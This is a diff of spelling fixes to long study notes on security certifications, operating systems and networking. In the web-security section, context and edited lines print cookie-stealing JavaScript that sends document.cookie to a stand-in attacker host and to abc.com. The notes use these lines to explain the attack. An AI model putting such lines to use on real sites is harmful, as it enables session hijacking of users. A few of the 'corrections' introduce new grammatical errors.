@@ -1352,7 +1352,7 @@ outputs False(1).
 Z
 - zero-day vulnerability—A vulnerability or bug that is unknown to trusted sources but can be exploited by attackers.
   - Zero-day attacks take advantage of zero-day vulnerabilities.
-   assignement
+   assignment
 只要网络硬件可以集中式软件管理，可编程化，控制转发层面分开，则可以认为这个网络 是一个SDN网络。
 1. 网络诞生之前:pc 单机运行，没有网卡，网线，协议饯，数据通过软盘，光盘... 2. 网络通信三要素:【IP地址+端口号+传输协议】三要素，是网络中通信必不可少
 的⻆色。
@@ -1732,7 +1732,7 @@ the destination to evade from firewall and IDS.)
   - frag: It uses IPv4 fragmented packets to encapsulate data.
 When some routers and firewalls (like Cisco routers and default Linux installation) receives fragmented packets without headers for the fourth layer, they permit pass it even if they have a rule that denies it.
   - As you can observe that it is successfully connected to 10.10.10.2 and we are to access the shell of the victim’s machine.
-    - if you check the network statics:
+    - if you check the network statistics:
   - Netstat: will not observe any process ID for tunnelshell.
   - ps command: check in process for tunnelshell.
   - Netstat command: check its process id. ⁃
@@ -2300,7 +2300,7 @@ Information Assurance Management System (IAMS)
   Check: monitor and review the IAMS
   Act: execute, maintain and improve the IAMS
 Information Systems
-An information system (IS) is an organized system for the collection, organization, storage and communication of informatio
+An information system (IS) is an organized system for the collection, organization, storage and communication of information
 3 activities of information systems produce information organizations need
   - Input: Captures raw data from organization or external environment
   - Processing: Converts raw data into meaningful form
@@ -2518,7 +2518,7 @@ must hold:
     -  ⁃
   - Cartesian product (X): Combines information of two different relations into one. r times s in new table.
  ⁃
-   -   - Request: No colum with same name.
+   -   - Request: No column with same name.
   - Rename (ρ)
   - The results of relational algebra are also relations but without any name.
   - The rename operation allows us to rename the output relation. ‘rename’ operation is denoted with small Greek letter rho ρ.
@@ -2572,7 +2572,7 @@ Provides overall framework for managing system debelopment process. All projects
   - Design: define
 Information
 Assets: people, data, technology(hard), (soft)
-systems: hardware, software, procesures, data
+systems: hardware, software, procedures, data
 IT auditors:
 Governance vy assessing riskd and monitoring controls over those risks Work as either internal or external auditor Many kind od audit engagements
 An Overview of Digital Forensics
@@ -6286,7 +6286,7 @@ HDDs are relatively simple.
 Each disk platter has a flat circular shape, like CD. Commonly diameters 3.5”, 2.5” and 1.8”.
 Storyge range from 30 GB to 3TB per drive.
 The two surfaces of a platter are covered with a magnetic material. store information: record magnetically on platters.
-read information: detecte the magnetic pattern on the platters.   A read–write head “flies” just above each surface of every platter. The heads are attached to a disk arm that moves all the heads as a unit.
+read information: detected the magnetic pattern on the platters.   A read–write head “flies” just above each surface of every platter. The heads are attached to a disk arm that moves all the heads as a unit.
 The surface of a platter:
 logically divided into circular tracks, subdivided into sectors. The set of tracks at a given arm position: make up a cylinder.
   - thousands of concentric cylinders in a disk drive,
@@ -6332,7 +6332,7 @@ sealed units:
   - helpful when a system needs more storage than can be connected at a given time or when it is necessary to replace a bad drive with a working one.
 removable units: CDs, DVDs, and Blu-ray discs.
 Drive attached to computer via I/O bus
-Busses vary, including EIDE, ATA, SATA, USB, Fibre Channel, SCSI,
+Buses vary, including EIDE, ATA, SATA, USB, Fibre Channel, SCSI,
 SAS, Firewire.
 Host controller in computer uses bus to talk to disk controller built in drive
 or storage array
@@ -6348,7 +6348,7 @@ Flash-memory-based NVM:
 frequently used in a disk-drive-like container, SSD (solid-state disk).
 In form of a USB drive (thumb drive or flash drive) or a DRAM stick.
 It is also surface-mounted onto motherboards as the main storage in devices like smartphones.
-In all forms, it acts and can be treated in the same way.  NVM devices can be more reliable than HDDs: Benifit:
+In all forms, it acts and can be treated in the same way.  NVM devices can be more reliable than HDDs: Benefit:
   - have no moving parts, much faster (no seek time or rotational latency),
   - consume less power.
   - More reliable then HDDs.
@@ -6462,7 +6462,7 @@ example, there are “shingled magnetic recording” hard drives with higher den
 There are also combination devices that include NVM and HDD technology, or volume managers that can knit together NVM and HDD devices into a storage unit faster than HDD but lower cost than NVM.
 These devices have different characteristics from the more common devices, and might need different caching and scheduling algorithms to maximize performance.
 Disk Attachment
-Host-attached storage accessed through I/O ports talking to I/O busses.
+Host-attached storage accessed through I/O ports talking to I/O buses.
 小型计算机系统接口(SCSI，Small Computer System Interface)是一种用于计算机及其週邊設備之间(硬盘、软 驱、光驱、打印机、扫描仪等)系统级接口的独立处理器标 准。
 SCSI itself is a bus, up to 16 devices on one cable
   - SCSI initiator requests operation
@@ -6752,7 +6752,7 @@ overestimate better than underestimate
   - Solaris: swap space = virtual memory exceeds pageable physical memory.
   - Linux:
   - swap space = double physical memory (past).
-  - the paging algorithms changed, use considerably less swap space (Today).   - Some operating systems (includ Linux) allow multiple swap spaces:
+  - the paging algorithms changed, use considerably less swap space (Today).   - Some operating systems (include Linux) allow multiple swap spaces:
   - including both files and dedicated swap partitions.
   - These swap spaces usually placed on separate storage devices so the load placed on the I/O system by paging and swapping can be spread over the system’s I/O bandwidth.
 11.6.2 Swap-Space Location
@@ -7135,7 +7135,7 @@ RAID-6: dual parity and striping.
  RAID-0: can be used where performance is required over fault tolerance: media streaming server.
 RAID-3: can be used where fault tolerance is required over performance: like authentication server
 RAID-5: email archive
-RAID-6: identify managment server.
+RAID-6: identify management server.
 When two levels are combined for a more potent solution numbers simply move into double digits
 Example:
   - RAID 10 / 0+1: combining RAID 1 with RAID 0
@@ -7316,7 +7316,7 @@ provides a basis for application programs
 acts as an intermediary between the computer user and the computer
 hardware.
 OS goals:
-Excute user programs and make solving user problems esaier Make the computer system conveninnt to use Ise the conputer garwae in an eddivient manner.
+Execute user programs and make solving user problems esaier Make the computer system conveninnt to use Ise the conputer garwae in an eddivient manner.
 536OS: chapter 1.1 What Operating Systems Do
 A computer system can be divided roughly into 4 components:
 1. the hardware (provides the basic computing resources for the system.)
@@ -7507,7 +7507,7 @@ Hardware may trigger an interrupt any time by sending a signal to the CPU, usual
 Interrupts: used for many purposes, key part of how OS and hardware interact, important part of computer architecture.
 When the CPU is interrupted 打断, it stops what it is doing and immediately transfers execution to a fixed location.
 The fixed location usually contains the starting address where the service routine for the interrupt is located.
-The interrupt service routine executes; on completion, the CPU resumes the interrupted computation. A timeline of this operation is shown in Figure 1.3. To run the animation assicated with this figure please click here.
+The interrupt service routine executes; on completion, the CPU resumes the interrupted computation. A timeline of this operation is shown in Figure 1.3. To run the animation associated with this figure please click here.
 Figure 1.3 Interrupt timeline for a single program doing output.  Each computer design has its own interrupt mechanism, but several functions are common.
 The interrupt must transfer control to the appropriate interrupt service routine. The straightforward method to manag the transfer is invoke interrupt-specific
 handler (generic routine) to examine the interrupt information.
@@ -8123,7 +8123,7 @@ load balancer
 virtual machines
 virtual machines
 storage
-cloud managment services
+cloud management services
 46 Chapter 1 Introduction
 with application-specific integrated circuits (ASICs) that perform their tasks without an operating system.
 The use of embedded systems continues to expand. The power of these devices, both as standalone units and as elements of networks and the web, is sure to increase as well. Even now, entire houses can be computerized, so that a central computer — either a general-purpose computer or an embedded system —can control heating and lighting, alarm systems, and even coffee makers. Web access can enable a home owner to tell the house to heat up before she arrives home. Someday, the refrigerator will be able to notify the grocery store when it notices the milk is gone.
@@ -8364,7 +8364,7 @@ Both the iPad iPhone use the Springboard touch-screen interface.
 ^ chapter 2.2.4 Choice of Interface
 command-line interface: System administrators who manage computers and power users with deep knowledge of a system
 more efficient, faster access to the activities need to perform.
-make repetitive tasks easier, they have their own programm ability.
+make repetitive tasks easier, they have their own programming ability.
 example, if a frequent task requires a set of command-line steps, those steps can be recorded into a file, and that file can be run just like a program. The program is not compiled into executable code but rather is interpreted by the command- line interface. These shell scripts are very common on systems that are command-line oriented, such as UNIX and Linux.
 GUI
 Recent versions of the Windows operating system provide both a standard GUI for desktop/laptops and touch screen for tablets.
@@ -8729,7 +8729,7 @@ iokit
 kexts scheduling Mach kernel
 Figure 2.17 The structure of Darwin.
                                  
-     ) and BSD system calls (which provide POSIX functionality). The interface to these system calls is a rich set of libraries that includes not only the standard C library but also libraries that provide networking, security, and progamming language support (to name just a few).
+     ) and BSD system calls (which provide POSIX functionality). The interface to these system calls is a rich set of libraries that includes not only the standard C library but also libraries that provide networking, security, and programming language support (to name just a few).
 Beneath the system-call interface, Mach provides fundamental operating- system services, including memory management, CPU scheduling, and inter- process communication (IPC) facilities such as message passing and remote procedure calls (RPCs). Much of the functionality provided by Mach is available through                    , which include tasks (a Mach process), threads, memory objects, and ports (used for IPC). example, an application may create a new process using the BSD POSIX fork() system call. Mach will, in turn, use a task kernel abstraction to represent the process in the kernel.
 In addition to Mach and BSD, the kernel environment provides an I/O kit for development of device drivers and dynamically loadable modules (which macOS refers to as                  , or      ).
 In Section 2.8.3, we described how the overhead of message passing between different services running in user space compromises the performance of microkernels. To address such performance problems, Darwin combines Mach, BSD, the I/O kit, and any kernel extensions into a single address space. Thus, Mach is not a pure microkernel in the sense that various subsystems run in user space. Message passing within Mach still does occur, but no copying is necessary, as the services have access to the same address space. Apple has released the Darwin operating system as open source. As a result, various projects have added extra functionality to Darwin, such as the X- 11 windowing system and support for additional file systems. Unlike Darwin, however, the Cocoa interface, as well as other proprietary Apple frameworks available for developing macOS applications, are closed.
@@ -10783,7 +10783,7 @@ Processes designed to manage the key IT risks.
 10. Maintain a high-quality systems development process.
 11. Incorporate sound project management techniques.
 The following four items represent the minimum contents of a good guidelines document:
-Scope and Purpose: overview and statement of the guideline’s intent. Withour scope, things never ends.
+Scope and Purpose: overview and statement of the guideline’s intent. Without scope, things never ends.
   - No verbiage: “This document contains the guidelines and procedures for the assignment and use of xyz and establishes the minimum requirements
  ▪
 
@@ -11417,7 +11417,7 @@ Red book
 
 
 ##  Green book
-  - Password management guidlines
+  - Password management guidelines
 TCSEC Classes and Required Functionality
 TCSEC combines the functionality and assurance rating of the confidentiality protection offered by a system into four major categories. These categories are then subdivided into additional subcategories identified with numbers, such as C1 and C2. Furthermore, TCSEC’s categories are assigned through the evaluation of a target system. Applicable systems are stand-alone systems that are not networked. TCSEC defines the following major categories:
 Select Controls and Countermeasures Based on Systems Security Evaluation Models 291 Category A
@@ -11646,7 +11646,7 @@ Exam Essentials 305
 306 Chapter 8 ■ Principles of Security Models, Design, and Capabilities
 classification levels. This enforces confidentiality. Biba prevents subjects with lower secu- rity levels from writing to objects at higher security levels. Clark-Wilson is an integrity model that relies on auditing to ensure that unauthorized subjects cannot access objects and that authorized users access objects properly. Biba and Clark- Wilson enforce integrity. Goguen-Meseguer and Sutherland focus on integrity. Graham-Denning focuses on the secure creation and deletion of both subjects and objects.
 Know the definitions of certification and accreditation. Certification is the technical evaluation of each part of a computer system to assess its concordance with security standards. Accreditation is the process of formal acceptance of a certified configuration from a designated authority.
-Be able to describe open and closed systems. Open systems are designed using industry standards and are usually easy to integrate with other open systems. Closed systems are generally proprietary hardware and/or software. Their specifications are not normally published, and they are usually harder to integrate with other systems. to reading from and writing to certain memory locations. Bounds are the limits of memory a process cann ## 2. Access Control Models
+Be able to describe open and closed systems. Open systems are designed using industry standards and are usually easy to integrate with other open systems. Closed systems are generally proprietary hardware and/or software. Their specifications are not normally published, and they are usually harder to integrate with other systems. to reading from and writing to certain memory locations. Bounds are the limits of memory a process can ## 2. Access Control Models
 Access Control Models
 Access control ensures that only authenticated and authorized entities can access resources.
 example, it ensures that only authenticated users who have been granted
@@ -12629,7 +12629,7 @@ The memory protection function is often performed by an separate chip that is ma
 If an attacker suddenly powered off the machine without properly shutting down and booted to another OS via external media, it may be possible to view these files and reconstruct portions of memory, potentially exposing sensitive information.
 To mitigate these risks, hard disk encryption should be used in all cases where potentially untrusted parties have physical access to a machine.
 encryption does not stop attacker from reading a swap file, since he would have physical access to the computer.
-But it does prevent attacker from geting the contents of files, he don’t have the decryption keys.
+But it does prevent attacker from getting the contents of files, he don’t have the decryption keys.
 3.3.2 Password-Based Authentication
 central question of operating systems security:
 How does the operating system securely identify its users?
@@ -12889,7 +12889,7 @@ Compiler: typically binds symbolic addresses to relocatable addresses (like “1
 linker / loader: binds the relocatable addresses to absolute addresses (such as 74014).
 Each binding is a mapping from one address space to another.
 The binding of instructions / data to memory addresses can be done at any step along the way:
-Compile time: If you know where the process will reside in memory, then absoulute code can be generated.
+Compile time: If you know where the process will reside in memory, then absolute code can be generated.
   - Example, if you know that a user process will reside starting at location R, then the generated compiler code will start at that location and extend up from there.
   - If later the starting location changes, then it need to recompile this code.
 Load time. If not know where the process will reside in memory, then the compiler must generate relocatable code. In this case, binding until load time.
@@ -12989,7 +12989,7 @@ Memory allocation: Multiple-partition allocation:
 One of the simplest methods: variable-partition scheme Degree of multiprogramming limited by number of partitions
 Initially, all memory is available for user processes   - one large block of available memory (hole).
 When a process arrives, it is allocated memory from a hole large enough to accommodate it
-Then, memory comes a set of contiguos holes of various sizes, scattered 分散的 throughout memory / partitions.
+Then, memory comes a set of contiguous holes of various sizes, scattered 分散的 throughout memory / partitions.
   - the OS keeps a table: which parts of memory are available and which are occupied.
    - a) allocated partitions
   - b) free partitions (hole)
@@ -13212,7 +13212,7 @@ Notice that this scheme has created a problem. Because the program extends only 
 Rarely does a process use all its address range. In fact, many processes use only a small fraction of the address space available to them. It would be wasteful in these cases to create a page table with entries for every page in the address range. Most of this table would be unused but would take up valuable memory space. Some systems provide hardware, in the form of a page-table length register (PTLR), to indicate the size of the page table. This value is checked against every logical address to verify that the address is in the valid range for the process. Failure of this test causes an error trap to the operating system. 9.3.4 Shared Pages
 An advantage of paging is the possibility of sharing common code, a considera- tion that is particularly important in an environment with multiple processes. Consider the standard C library, which provides a portion of the system call interface for many versions of UNIX and Linux. On a typical Linux system, most user processes require the standard C library libc. One option is to have each process load its own copy of libc into its address space. If a system has 40 user processes, and the libc library is 2 MB, this would require 80 MB of memory.
 If the code is reentrant code, however, it can be shared, as shown in Figure 9.14. Here, we see three processes sharing the pages for the standard C library libc. (Although the figure shows the libc library occupying four pages, in reality, it would occupy more.) Reentrant code is non-self-modifying code: it never changes during execution. Thus, two or more processes can execute the same code at the same time. Each process has its own copy of registers and data storage to hold the data for the process’s execution. The data for two different processes will, of course, be different. Only one copy of the standard C library need be kept in physical memory, and the page table for each user process maps onto the same physical copy of libc. Thus, to support 40 processes, we need only one copy of the library, and the total space now required is 2 MB instead of 80 MB—a significant saving!
-In addition to run-time libraries such as libc, other heavily used programs can also be shared — compilers, window systems, database systems, and so on. The shared libraries discussed in Section 9.1.5 are typically implemented with shared pages. To be sharable, the code must be reentrant. The read-only nature of shared code should not be left to the correctness of the code; the operating system should enforce this property.
+In addition to run-time libraries such as libc, other heavily used programs can also be shared — compilers, window systems, database systems, and so on. The shared libraries discussed in Section 9.1.5 are typically implemented with shared pages. To be shareable, the code must be reentrant. The read-only nature of shared code should not be left to the correctness of the code; the operating system should enforce this property.
 The sharing of memory among processes on a system is similar to the sharing of the address space of a task by threads, described in Chapter 4. Furthermore, recall that in Chapter 3 we described shared memory as a method of interprocess communication. Some operating systems implement shared memory using shared pages.
 Organizing memory according to pages provides numerous benefits in addition to allowing several processes to share the same physical pages. We cover several other benefits in Chapter 10.
 9.5 Swapping
@@ -13241,7 +13241,7 @@ program no longer be constrained by available physical memory. Users would be ab
 each program take less physical memory, more programs could be run at the same time, increase CPU utilization and throughput with no increase in response time or turnaround time.
 Less I/O would be needed to load or swap portions of programs into memory, so each program would run faster.
 benefit both the system and its users.
-Virutal memory: the separation of logical memory as perceived by developers from physical memory. This separation allows an extremely large virtual memory to be provided for programmers when only a smaller physical memory is available.  The virtual address space of a process = the logical/virtual view of how a process is stored in memory.
+Virtual memory: the separation of logical memory as perceived by developers from physical memory. This separation allows an extremely large virtual memory to be provided for programmers when only a smaller physical memory is available.  The virtual address space of a process = the logical/virtual view of how a process is stored in memory.
 Typically, process begins at a certain logical address (like address 0) and exists in contiguous memory, like Figure 10.2.  In fact physical memory is organized in page frames
 the physical page frames assigned to a process may not be
 contiguous.
@@ -13652,7 +13652,7 @@ More than a few tools are dedicated to performing DoS on systems. Low Orbit Ion 
  PlayStation network, and the tool has a track record of other successful hits: the Recording Industry Association of America, PayPal, MasterCard, and several other companies have all fallen victim to LOIC.
 Figure 9-4 LOIC
 Other tools include Trinity, Tribe Flood Network, and R-U-Dead-Yet. Trinity is a Linux-based DDoS tool much like LOIC. Tribe Flood Network is much the same, using voluntary botnet systems to launch massive flood attacks on targets. R-U-Dead- Yet (known by its acronym RUDY) performs DoS with HTTP POST via long-form field submissions. We could go on here, but I think you get the point. Do a quick Google search for “DoS Tool” or “DDos Tool”—you’ll find more than you need to know.
-NOTE Another really groovy DoS tool worth mentioning here (even though I don’t think it’s part of your exam) isSlowloris. Slowloris is a TCP DoS tool that basically ties up open sockets and causes services to hang. It’s useful against web servers and doesn’t consume large amounts of bandwidth (www-ng.cert- ist.com/eng/ressources/ Publications_ArticlesBulletins/Environnementreseau/200906_slowloris/
+NOTE Another really groovy DoS tool worth mentioning here (even though I don’t think it’s part of your exam) isSlowloris. Slowloris is a TCP DoS tool that basically ties up open sockets and causes services to hang. It’s useful against web servers and doesn’t consume large amounts of bandwidth (www-ng.cert- ist.com/eng/resources/ Publications_ArticlesBulletins/Environnementreseau/200906_slowloris/
  _print/).
 Finally, when it comes to countermeasures against DoS attacks, you’ve probably heard all this before, so we don’t need to spend a large amount of time on the subject. Actions such as disabling unnecessary services, using a good firewall policy, and keeping security patches and upgrades up to date are pretty standard fare. Additionally, the use of a good NIDS can help against attacks from across the network. Strong, security- conscious code should be an absolute for your applications, and the use of tools such as Skydance can help detect and prevent DoS attacks. You might also look into network ingress filtering as well as some network auditing tools to help along the way.
 NOTE The real answer to a true DDoS is the involvement of your ISP up channel. It will be next to impossible for you, at an endpoint locale, to keep up with attacks from a sophisticated global (or even geographically close) botnet. The ISP may wind up blocking a lot of legitimate traffic, too, but it may be all you can do until the storm passes.
@@ -14237,7 +14237,7 @@ Keylogger
 - The log file is often encrypted, isn’t easily seen or accessed by other.
 - keyloggers
   - software
-  - Or installed on harware too:
+  - Or installed on hardware too:
   - keyboard adapters that can be placed on a system and retrieved at a
 later date.
   - These hardware devices store the log file and operate as hidden drives until unlocked using their unlock code.
@@ -14409,7 +14409,7 @@ and generally a pretty wild bit of code.   - modifies directory table entries so
 案
 特徵
 10. Metamorphic Virus:變態病毒，每次改染會改變自己很多的特 徵
-  - rewrites itself everytime it infects a newfile.
+  - rewrites itself every time it infects a newfile.
 11. File Overwriting / Cavity 洞 Virus:病毒會插在儲存空間的空隙
 12. Sparse Infector Virus:只會在特定時間點或特定檔案大小時才
 會去感染
@@ -14722,7 +14722,7 @@ routinely check your spam folders, if legitimate email is being inadvertently fl
 
 ## Antivirus Software
 antivirus software
-primary method: prevente the propagation of malicious code Application installed to protect it and to scan for viruses Antivirus software looks for these characteristics, fingerprints,
+primary method: prevented the propagation of malicious code Application installed to protect it and to scan for viruses Antivirus software looks for these characteristics, fingerprints,
      -   - ⁃
 Most viruses have common characteristics.
 to identify and neutralize viruses before they impact you.
@@ -18215,7 +18215,7 @@ If a vulnerable application is available on a sub-domain, this
 ## mechanism can be abused in a session fixation 定位 attack. When the user visits a page on the parent domain (or another subdomain), the application may trust the existing value sent in the user's cookie. This could allow an attacker to bypass CSRF protection or hijack a session after the user logs in.
 Alternatively, if the parent domain does not
 use HSTS with includeSubdomains set, a user subject to an active MITM (perhaps connected to an open WiFi network) could be served a response with a Set-Cookie header from a non- existent sub-domain. The end result would be much the same, with the browser storing the illegitimate cookie and sending it to all other pages under example.com.
-Session fixation should primarily be mitigated by regenerating session cookie values when the user authenticates (even if a cookie already exists) and by tieing any CSRF token to the user. As a defence in depth measure, however, it is possible to
+Session fixation should primarily be mitigated by regenerating session cookie values when the user authenticates (even if a cookie already exists) and by tying any CSRF token to the user. As a defence in depth measure, however, it is possible to
 use cookie prefixes to assert specific facts about the cookie. Two prefixes are available:
 __Host-
   - If a cookie name has this prefix, it will only be accepted in a Set-Cookie directive if it is marked Secure, was sent from a secure origin, does not include
@@ -18282,7 +18282,7 @@ Common ways to steal cookies:
 当用户点击这个链接的时候，浏览器就会执行onclick里面的代码，结果 这个网站用户的cookie信息就会被发送到abc.com攻击者的服务器。攻 击者同样可以拿cookie搞事情。
 解决办法: 通过cookie的HttpOnly属性，设置了HttpOnly属性，javascript代
      (new Image()).src = "https://www.evil-domain.example.com/steal- cookie?cookie=" + document.cookie;
- <a href="#" onclick=`window.location=https:// abc.com?cookie=${docuemnt.cookie}`>领取红包</a>
+ <a href="#" onclick=`window.location=https:// abc.com?cookie=${document.cookie}`>领取红包</a>
  ▪
 
 
@@ -22179,7 +22179,7 @@ Countermeasures
   - Validation, filters the user input so that the browser interprets
 it as code without malicious commands.
   - All input data should be checked for data type, format, range, and irregular expressions.
-  - Whiltelist of allowed values
+  - Whitelist of allowed values
      - The primary protection:
   - the web application with sophisticated input validation
 techniques.
@@ -23161,7 +23161,7 @@ Wireshark also knows loads of other protocols. help understand encrypted communi
   - the different frames are used to set up the encryption for a TLS session.
   - Open the protocol in the decode pane
   - What you can see is the version of TLS that is being
-used as well as the specifc message that is being sent.
+used as well as the specific message that is being sent.
   - You know this based on the header information because the entire message isn’t yet being encrypted.
  ▪
 
@@ -23319,7 +23319,7 @@ active sniffing:
 A. MAC Flooding
 B. ARP Spoofing
 D. MAC Duplicating
-Prentend a systen you aren’t.
+Prentend a system you aren’t.
 When you want to get the information to you (for packet capture..)
  ▪
 
@@ -23626,7 +23626,7 @@ gateway, none of them can reach it, and it stops all traffic out of the network.
 arpspoof:
 - Dug Song
 - for inject between two systems on the network
-- just choose 2 IP, It taks cares the rest of it.  •
+- just choose 2 IP, It takes cares the rest of it.  •
 - Not selecting a pair of hosts to sit between, bur sit between the entire network and the default gateway.
 - problem: only one side of the conversation will arrive at this system-the side that is destined for the default gateway.
 - The response from outside the network won't show up at the system where arpspoof is running.
@@ -23804,7 +23804,7 @@ ARP poisoning.
 - This tool allows users to have multiple added layers of passive and
  active defense against ARP Poisoning. A Free Version of Xarp can be downloaded but a paid version is available. The free version of XARP has several Modules that have specific functions. If those conditions are violated they will generate a notification for the User.
 - modules is provided by XARP.
-- “ChangeFilter: Module keeps tracks of IP-to-Mac Adress mapping.
+- “ChangeFilter: Module keeps tracks of IP-to-Mac Address mapping.
 - Every ARP Packet contains a mapping of IP-to-MAC addresses.
 ARP request contains the IP-to-MAC mapping of the sender. ARP replies to contain the IP-to-MAC mapping of the machine resolved. Every mapping is inserted into a database. If a mapping is monitored that break current mapping, an alert is generated. Using Network discoverers, the database is filled quickly and more reliably than without network discoverers.
 - CorruptFilter: ARP packets have a special restriction.
@@ -23984,7 +23984,7 @@ First, an attacker must issue a response to her own DNS query before the authori
 
 
 ## chance to perform a lookup and issue a reply. Second, each DNS request is given a 16-bit query ID.
-  - If the response to a query donot have same ID like request, it will be ignored.
+  - If the response to a query do not have same ID like request, it will be ignored.
   - If he successfully guesses the random query ID chosen by the ISP DNS server, the response will be cached.
   - This guessing is actually more likely if the attacker issues a lot of fake requests and responses to the same domain name lookup.
   - In 2002, most major DNS software simply used sequential numbers for query IDs, allowing easy prediction and circumvention of this naive authentication. Once this bug was disclosed, most DNS software vendors implement randomization of query IDs.
@@ -25225,7 +25225,7 @@ SSID broadcast/cloaking: Many networks regularly broadcast their name to announc
   - To protect the network: disable/turn off the SSID broadcast.
   - The access point is still there and accessible, and prevents those who are just scanning from finding it.   - This is considered a very weak form of security: because there are still other complicated ways to discover the presence of the access point even no SSID broadcast.
   - 1) Completely disable the sending of beacons
-  - 2) Disable reponses to a broadcast probe request
+  - 2) Disable responses to a broadcast probe request
   - except in cases where the probe request was explicitly addressed to the correct SSID (ignore broadcast probe requests to the wildcardSSID) and was from an authorized client (apply MAC Address filtering), and even send a null SSID in the probe responses to those.
 Site surveys: listening in on an existing wireless network using commercially available technologies.
   - allows intelligence, data capture, to be performed on systems in your wireless network.
@@ -25449,7 +25449,7 @@ RFID Attacks
 Radio-frequency identification (RFID) systems:
 include an RFID reader and RFID tags placed on objects.
 They are used to track and manage inventory, any type of valuable assets (objects and animals)
-There’s an almost endless assortment of tags available for multiple purposes. This includes tags implanted into animals, packaging for any type of product (such as computers), pharmaceuticals, transportation systems (such as shipping containers, railcars, and busses), and controlled substances (such as pharmaceutical containers).
+There’s an almost endless assortment of tags available for multiple purposes. This includes tags implanted into animals, packaging for any type of product (such as computers), pharmaceuticals, transportation systems (such as shipping containers, railcars, and buses), and controlled substances (such as pharmaceutical containers).
 Some tags are only slightly larger than a grain of rice.
 Tags do not have a power source.
 Instead, they include electronics that allow them to collect and use power to
@@ -26851,7 +26851,7 @@ Data loss prevention (DLP) systems
 monitor the contents of systems (workstations, servers, and networks) to make sure that key content is not deleted or removed.
   - Resolution: block USB and other interfaces.
 also monitor who is using/transmitting the data. (looking for unauthorized access) DLP systems share commonality with network intrusion prevention systems. monitoring can be cloud based and limited to specific applications (like email). Example:
-   - Receive non-company account from coworker with sensetive information: Implement DLP solution on the email gateway to scan email and remove sensitive data or files.
+   - Receive non-company account from coworker with sensitive information: Implement DLP solution on the email gateway to scan email and remove sensitive data or files.
 MyDLP (One of the best-known DLP systems)
 open source solution that runs on most Windows platforms. www.mydlp.org.
 A large number of commercial programs are available for purchase.
@@ -27047,7 +27047,7 @@ No bandwidth constraints
   - Broadcast addresses provide additional leverage
 Physical / Network interface layer:
   - encompasses the physical and data link layers of the OSI model.
-  - equipments:
+  - equipment:
   - repeaters: amplify, reshape or regenerate signal during retransmission.
   - typically used when long distances need to be covered and the distance exceeds the supported length (medium) or range (wireless)
   - hubs: received 1 port and retransmits to every port. (uncommon today)
@@ -27061,7 +27061,7 @@ Physical / Network interface layer:
   - command-line interface via Telnet or console port to
 configure remotely.
   - brewer-based interface or configuration.
-  - usual protocal: ARP for IPv4, NDP for IPv6, PPP, SLIP(been replaced by PPP, only in older network)
+  - usual protocol: ARP for IPv4, NDP for IPv6, PPP, SLIP(been replaced by PPP, only in older network)
   - threats:
   - spoofing MAC addresses: bypass the 802.11 wireless controls,
 to circumvent switches used to lock ports to specific MAC addresses.
@@ -27227,7 +27227,7 @@ indicates a binary value.
 Physical layer characteristics:
 - Voltage levels
 - Data rates
-- Maximun transimission distances
+- Maximum transimission distances
 - Timing of voltage changes
 - Physical connectors and adaptors
 - Topology or physical layout of the network
@@ -27351,7 +27351,7 @@ Transport layer
 16-bit addresses (ports) for classes of applications Connection-oriented transmission layer protocol (TCP) Connectionless user datagram protocol (UDP)
 Layer 2: The Data Link Layer (Frames)
 These processes are collectively referred to as data link control (DLC).
-Frames: a container into wich the data to be transmitted can be plced
+Frames: a container into which the data to be transmitted can be plced
 for delivery.
   - A standard format for sending and receiving data is established, allowing for mutual understanding of the data being hardled.
   - Ethernet (IEEE 802.3), token ring (IEEE 802.5), and wireles (IEEE 802.11) all have their own qnique and incompatible frame type.
@@ -27360,7 +27360,7 @@ transmitting frames on the network,
 
 
 ##   - Sending station: packages the info into frams
-  - Receving station: unpacks the info from frams and moves it
+  - Receiving station: unpacks the info from frams and moves it
 along to the next layer for further processing. performing error detection/correction,
 uniquely identifying network devices with an address, handling flow control: data management. avoid overwhelm.
 two sublayers: LLC and MAC.
@@ -27470,9 +27470,9 @@ Ethernet. Link-layer protocol standardized IEEE 802.3
 - MTU Maximum transmission unit - 1500 bytes by default.
   - Max bytes in an individual frame. (Header+all data)
   - Can be change on devices.
-  - But all devices on thet segement needs to be changed.
+  - But all devices on thet segment needs to be changed.
   - Ethernet provide no fragment or segment a frame
-  - Betwenn segement, router can fragment frames
+  - Between segment, router can fragment frames
 - IEEE - Institute of Electrical and Electronics Engineers standards
 - In general, IEEE 802.3 = Ethernet.
   - some subtle distinctions.
@@ -28155,7 +28155,7 @@ There may be many virtual connections established in the switch at one time
 Incoming, outgoing VCI values are not generally the same VCI value is not a globally significant identifier for
 connection
 It has significance only on a given link
-When new connection is created, need to assign a new VCI value for that connection on each passed link, in same link, diffrent connection need different VCI value.
+When new connection is created, need to assign a new VCI value for that connection on each passed link, in same link, different connection need different VCI value.
 Two approach to establishing connection state
 ■ Network Administrator configure the state ■ The virtual circuit is Permanent Virtual Circuit(PVC)
 ■ The network administrator can delete this
@@ -28170,7 +28170,7 @@ Network Administrator configure the state
 ■ First the administrator identifies a path through the network from A to B
 ■ The administrator picks VCI value for each link for the connection
 ■ VCI value 5 is chosen for the link from host A to switch 1 ■ VCI value11 is chosen for the link from switch 1 to switch 2
-■ VCI value 7 is chosen for link from switch 2 to switch 3 VCI value 4 is chosen for the link from switch 3 to host B  Switchs are configured, have following entry in VC table
+■ VCI value 7 is chosen for link from switch 2 to switch 3 VCI value 4 is chosen for the link from switch 3 to host B  Switches are configured, have following entry in VC table
 2 5 1 11
 3 11 2 7
 0714
@@ -28237,7 +28237,7 @@ Switch 2:
 11 Finally switch 1:
   - passes the acknowledgement to host A
   - telling it to use the VCI value 5 for this connection.
-Host A has a firm acknowledgement that everthing is in place all the way to host B.
+Host A has a firm acknowledgement that everything is in place all the way to host B.
 Tears down:
 When host A no longer wants to send data to host B, it tears down the connection by sending a teardown message to switch 1
 The switch 1:
@@ -28294,8 +28294,8 @@ In VC:
 而無法正常傳送資料。
   - providing each circuit with a different quality of service (QoS)
   - Example:
-  - Switchs might allocate a percentage of each outgoing link’s bandwidth to that circuit
-  - Delay tolerance on each switch: ensure that packet belonging to a partivular circuit not be delayed/queued for for than a certain amount of time. Most popular examples of VC technologies are Frame Relay and ATM Most commom now aday: the construction of VPN
+  - Switches might allocate a percentage of each outgoing link’s bandwidth to that circuit
+  - Delay tolerance on each switch: ensure that packet belonging to a partivular circuit not be delayed/queued for for than a certain amount of time. Most popular examples of VC technologies are Frame Relay and ATM Most common now aday: the construction of VPN
  Assumptions
 Each host has a globally unique address
 There is some way to identify the input and output ports of each
